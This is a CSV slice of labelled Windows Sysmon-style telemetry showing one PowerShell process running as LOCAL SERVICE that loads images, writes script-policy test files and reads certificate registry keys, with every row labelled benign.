timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:08.7360000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7560000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7610000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9110000Z,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_5f34qx4d.0qx.ps1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9110000Z,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_i1jtgrrb.hiw.psm1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
